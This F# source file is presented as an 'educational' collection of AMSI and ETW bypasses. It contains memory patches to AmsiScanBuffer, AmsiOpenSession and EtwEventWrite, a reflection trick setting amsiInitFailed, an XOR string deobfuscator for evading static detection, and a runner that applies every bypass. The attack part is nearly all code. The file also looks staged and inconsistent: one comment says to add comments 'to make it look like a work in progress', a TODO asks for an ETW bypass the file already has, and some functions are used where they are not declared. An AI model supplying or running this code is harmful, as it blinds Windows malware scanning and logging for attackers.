// AMSI Bypass Collection - Generic Examples
// Inspired by various public techniques
// For educational purposes only

// Memory Patching Technique - Similar to rastamouse approach
module AmsiPatch

open System
open System.Runtime.InteropServices

let patchAmsiScanBuffer() =
    // Find amsi.dll
    let amsiDll = "amsi.dll"
    let hModule = LoadLibrary(amsiDll)
    
    // Get address of AmsiScanBuffer
    let scanBufPtr = GetProcAddress(hModule, "AmsiScanBuffer")
    if scanBufPtr = IntPtr.Zero then
        failwith "Could not find AmsiScanBuffer export"
    
    // Create patch bytes (ret instruction)
    let patchBytes = [| 0xC3uy |]
    
    // Apply the patch
    let mutable oldProtect = 0u
    VirtualProtect(scanBufPtr, uint32 patchBytes.Length, 0x40u, &&oldProtect) |> ignore
    
    // Copy patch to memory
    Marshal.Copy(patchBytes, 0, scanBufPtr, patchBytes.Length)
    
    // Restore protection
    VirtualProtect(scanBufPtr, uint32 patchBytes.Length, oldProtect, &&oldProtect) |> ignore
    
    printfn "[+] AMSI patch applied successfully"

[<DllImport("kernel32")>]
extern IntPtr LoadLibrary(string lpFileName)

[<DllImport("kernel32", CharSet = CharSet.Ansi)>]
extern IntPtr GetProcAddress(IntPtr hModule, string procName)

[<DllImport("kernel32")>]
extern bool VirtualProtect(IntPtr lpAddress, uint32 dwSize, uint32 flNewProtect, uint32& lpflOldProtect)


// Reflection-based AMSI bypass technique
module AmsiBypassReflection

open System
open System.Reflection

let bypassAmsiWithReflection() =
    // Load necessary assembly
    let asm = Assembly.Load("System.Management.Automation")
    
    // Find AmsiUtils type
    let amsiUtilsType = asm.GetType("System.Management.Automation.AmsiUtils")
    if isNull amsiUtilsType then
        failwith "Could not find AmsiUtils type"
    
    // Find the field to modify
    let fieldInfo = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic ||| BindingFlags.Static)
    if isNull fieldInfo then
        failwith "Could not find amsiInitFailed field"
    
    // Set field to true to indicate AMSI init failed
    fieldInfo.SetValue(null, true)
    printfn "[+] AMSI disabled via reflection"


// Context forced failure technique
module AmsiContextFailure

open System
open System.Runtime.InteropServices

[<DllImport("amsi")>]
extern int AmsiInitialize(string appName, IntPtr& context)

[<DllImport("amsi")>]
extern int AmsiUninitialize(IntPtr context)

[<DllImport("amsi")>]
extern int AmsiOpenSession(IntPtr context, IntPtr& session)

let forceContextFailure() =
    let mutable context = IntPtr.Zero
    let mutable session = IntPtr.Zero
    
    // Initialize AMSI
    let result = AmsiInitialize("PowerShell", &&context)
    if result <> 0 then
        failwith "Failed to initialize AMSI"
    
    // Get AmsiOpenSession address and patch it
    let amsiDll = LoadLibrary("amsi.dll")
    let openSessionAddr = GetProcAddress(amsiDll, "AmsiOpenSession")
    
    // Patch bytes (return error code)
    let patchBytes = [| 0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC3uy |] // mov eax, 0x80070057; ret
    
    // Apply patch
    let mutable oldProtect = 0u
    VirtualProtect(openSessionAddr, uint32 patchBytes.Length, 0x40u, &&oldProtect) |> ignore
    Marshal.Copy(patchBytes, 0, openSessionAddr, patchBytes.Length)
    VirtualProtect(openSessionAddr, uint32 patchBytes.Length, oldProtect, &&oldProtect) |> ignore
    
    printfn "[+] AMSI context creation patched to always fail"


// Generic ETW bypass - often paired with AMSI bypass
module EtwBypass

open System
open System.Runtime.InteropServices

let bypassEtw() =
    // Locate ntdll
    let ntdll = LoadLibrary("ntdll.dll")
    
    // Get EtwEventWrite address
    let etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite")
    
    // Prepare patch (ret 14)
    let patch = [| 0xC2uy; 0x14uy; 0x00uy |]  // ret 14h
    
    // Apply patch
    let mutable oldProtect = 0u
    VirtualProtect(etwEventWrite, uint32 patch.Length, 0x40u, &&oldProtect) |> ignore
    Marshal.Copy(patch, 0, etwEventWrite, patch.Length)
    VirtualProtect(etwEventWrite, uint32 patch.Length, oldProtect, &&oldProtect) |> ignore
    
    printfn "[+] ETW telemetry disabled"


// String obfuscation helper - to bypass static detection
module ObfuscationHelpers

open System
open System.Text

let deobfuscateString (encoded: string) =
    let bytes = Convert.FromBase64String(encoded)
    let xorKey = 0x3Aby
    
    let result = Array.zeroCreate<byte> bytes.Length
    for i = 0 to bytes.Length - 1 do
        result.[i] <- byte (int bytes.[i] ^^^ xorKey)
    
    Encoding.UTF8.GetString(result)

// Example usage:
// let amsiDllEncoded = "XmFzCmdpLmR4bGw="  // "amsi.dll" obfuscated
// let realString = deobfuscateString amsiDllEncoded


// Main runner
let runAllBypasses() =
    try
        printfn "[*] Starting AMSI bypass techniques..."
        AmsiPatch.patchAmsiScanBuffer()
        AmsiBypassReflection.bypassAmsiWithReflection()
        AmsiContextFailure.forceContextFailure()
        EtwBypass.bypassEtw()
        printfn "[+] All bypasses completed successfully"
        true
    with
    | ex -> 
        printfn "[!] Error occurred: %s" ex.Message
        false

// Add comments to make it look like a work in progress
// TODO: Add registry modification technique
// TODO: Implement in-memory module stomping
// TODO: Add ETW bypass
// NOTE: Test against latest Windows Defender signatures - Matt
// FIXME: The reflection method fails on newer .NET versions
